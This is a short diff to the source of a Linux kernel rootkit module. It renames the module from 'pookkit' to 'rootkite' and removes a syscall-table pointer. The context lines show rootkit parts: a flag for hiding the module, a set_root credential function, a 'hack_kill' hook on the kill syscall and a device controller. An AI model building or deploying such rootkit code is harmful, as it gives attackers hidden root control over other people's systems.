@@ -20,10 +20,9 @@ MODULE_AUTHOR("NondairyDig");
 MODULE_VERSION("0.5");
 
 
-
 static int hidden = 0; // flag if module is hidden
 static struct list_head *prev_module;
-unsigned long *__SYS_CALL_TABLE; // variable for a pointer to the syscall table
+
 
 static void set_root(void){
     struct cred *p_creds;
@@ -273,7 +272,7 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
 
 
 static int __init mod_init(void){
-    printk(KERN_INFO "Activated pookkit, Initializing & Hooking Kill\n");
+    printk(KERN_INFO "Activated rootkite, Initializing & Hooking Kill\n");
     misc_register(&controller); // register the device for interaction within filesystem
     if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "__x64_sys_kill") == 1){ //hook the kill function for interaction with the lkm
         printk(KERN_ERR "error hooking syscall %d\n", __NR_kill);
@@ -285,7 +284,7 @@ static int __init mod_init(void){
 static void __exit mod_exit(void){
     fh_remove_hooks(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE); //cleanup the hooks and revert them
     misc_deregister(&controller); // deregister the device controller
-    printk(KERN_INFO "pookkit: exit\n");
+    printk(KERN_INFO "rootkite: exit\n");
 }
 
 
